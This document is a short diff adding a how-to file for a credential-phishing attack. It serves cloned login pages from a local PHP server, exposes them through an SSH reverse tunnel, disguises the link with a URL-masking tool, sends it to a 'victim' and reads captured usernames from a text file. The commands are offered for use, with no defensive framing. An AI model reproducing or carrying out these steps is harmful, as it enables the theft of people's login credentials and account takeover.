@@ -1,0 +1,16 @@
+#### Social enginering attack new method
+
+$ cd /yourbigbrother/sites/*anysitename*
+$ php -S localhost:80
+
+#### In another terminal type
+
+$ ssh -R 80:localhost:80 localhost.run
+
+#### Mask your link using maskphish
+
+#### Send the link generated with ssh command to victim
+
+#### see in file /yourbigbrother/sites/*any webstite*/unsernames.txt
+
+
